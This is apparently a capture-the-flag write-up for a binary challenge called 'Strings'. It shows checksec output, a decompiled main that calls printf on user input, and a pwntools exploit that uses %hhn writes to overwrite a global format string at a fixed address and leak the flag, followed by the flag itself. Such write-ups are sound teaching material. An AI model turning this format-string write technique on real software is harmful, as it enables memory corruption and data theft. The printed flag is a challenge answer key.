# **Strings**
TL;DR 2 in 1 format string vulnerability

# Executable
Checksec :
```
[*] '/home/skuuk/n00bz/strings'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
Ghidra decompilation :
```C
void main(EVP_PKEY_CTX *param_1)

{
  long in_FS_OFFSET;
  char local_78 [104];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  init(param_1);
  puts("Do you love strings? ");
  fgets(local_78,100,stdin);
  printf(local_78);
  main2();
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}

void main2(void)

{
  FILE *__stream;
  long in_FS_OFFSET;
  char local_38 [40];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  __stream = fopen("flag.txt","r");
  fgets(local_38,0x28,__stream);
  printf(fake_flag);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

# Vulnerability
The vulnerability is a textbook format string, with no escaping of user input : 
```C
fgets(local_78,100,stdin);
printf(local_78);
```
There are many possibilities from there.

I decided to overwrite `fake_flag`, since it's in writeable memory and its address is known (no PIE), so as to print `local_38` which contains the actual flag.

This is achieved by overwriting bytes of `fake_flag` with a `%s` format specifier: as can be seen in gdb, when calling `printf(fake_flag)`, `rsi` holds the true flag !

# Exploit
```python
io = start()
io.sendline(b"%37c%9$hhn%78c%10$hhnPPP" + p64(0x404060) + p64(0x404061))
io.interactive()
```
Essentially we craft our payload to write a number of characters corresponding to `%`(37 in ascii) and to `s`(115=37+78 in ascii), and so that these counts are stored in fake_flag (which is at address `0x404060`)
- The buffer holding our input can be found on the stack. 
- It corresponds to the 6th (starting from 0) argument sent to printf (you can figure this out by experimenting with format specifiers or in gdb)
- `PPP` is used to align our payload
- The adresses at the end of the payload are arguments 9 and 10
- prefixing a format specifier by `X$`, where `X` is a number, allows to specify the `X`th argument is used by the current format specifier
- The `n` format specifier writes to the location pointed by the current argument the number of bytes printed until now by the current `printf` as an int (4 bytes)
- With `hhn`, we write the number of bytes printed until now by the current `printf` as a single byte
- `Xc` where `X` is a number, writes `X` times the current argument as a char.

# Resources
I looked at the following article as a refresher on format strings attacks:
https://ir0nstone.gitbook.io/notes/types/stack/format-string

For more info about format specifiers, look at the man page of printf :
```
$ man 3 printf
```


# Flag
```
n00bz{f0rm4t_5tr1ng5_4r3_th3_b3s7!!!!!}
```
